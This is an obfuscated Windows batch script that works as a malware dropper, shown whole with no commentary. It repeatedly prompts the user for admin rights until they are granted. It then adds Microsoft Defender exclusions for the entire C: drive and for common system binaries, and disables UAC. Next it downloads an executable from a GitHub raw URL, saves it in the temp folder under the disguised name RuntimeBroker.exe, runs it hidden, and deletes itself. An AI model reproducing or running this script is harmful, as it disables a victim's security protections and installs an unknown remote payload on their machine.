@echo off & setlocal enableDelayedExpansion
set "x0=NET" & set "x1=SESSION" & set "x2=>nul" & set "x3=2>&1"
%x0% %x1% %x2% %x3%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "p1=powershell -ExecutionPolicy Bypass -Command"
set "p2=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "p3='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "p4='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!p1! "!p2! !p3! !p4!" %x2% %x3%
set "r1=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "r2=-Name 'EnableLUA' -Value 0"
!p1! "!r1! !r2!" %x2% %x3%
set "c1=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }"
!p1! "!c1!" %x2% %x3%
if !errorlevel! neq 0 (goto %a%)
set "t=timeout /t" & !t! 2 %x2% %x3%
set "d1=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "d2=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "d3=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!p1! "!d1! !d2! !d3!" %x2% %x3%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!t! 1 %x2% %x3% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %x2% %x3%
del /f /q "%~f0" %x2% %x3%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %x2% %x3%
if !errorlevel! neq 0 (!t! 3 %x2% %x3% & goto %b%)
exit /b
